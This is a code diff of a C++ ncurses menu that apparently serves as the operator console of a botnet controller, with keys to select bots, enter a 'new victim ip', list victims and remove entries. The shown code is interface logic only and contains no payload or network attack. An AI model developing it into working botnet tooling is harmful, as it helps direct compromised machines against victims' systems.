@@ -1,8 +1,8 @@
 #include "user_interface.h"
 
 user_interface::user_interface() {
-	commands_info_ = {"[u] - update the view", "[j]/[k] - select bot", "[r] - remove selected item",
-			  "[i] - input new victim ip", "[v] - view active victims"};
+	commands_info_ = {"[h] - update bot list", "[l] - update victims list", "[j]/[k] - select bot",
+			  "[r] - remove selected item", "[i] - input new victim ip"};
 
 	initscr();
 	noecho();
@@ -94,12 +94,20 @@ void user_interface::mainWindowMenu() {
 					}
 				}
 				break;
-			case 'u':
+			case 'h':
 				get_bots_data_callback_();
 				main_window_m_.lock();
 				break;
+			case 'l':
+				get_victims_data_callback_();
+				main_window_m_.lock();
+				break;
 			case 'r':
-				remove_bot_callback_(bot_ip_addresses_[current]);
+				if (active_tab_ == "[GET_BOT_INFO]") {	//? Definitely need to make better solution in the future
+					remove_bot_callback_(main_menu_options_idicators_[current]);
+				} else {
+					remove_victim_callback_(main_menu_options_idicators_[current]);
+				}
 				break;
 			case 'i':
 				std::string input = getInput();
@@ -175,7 +183,7 @@ void user_interface::updateMainWindowMenu(std::vector<std::string>& params) {
 	}
 
 	main_window_menu_options_ = std::move(data_output);
-	bot_ip_addresses_ = std::move(ip_addresses);
+	main_menu_options_idicators_ = std::move(ip_addresses);
 
 	reRenderMainWindowBox();
 	updateMainWindowTitles(params, max_params_lenghts, separator);
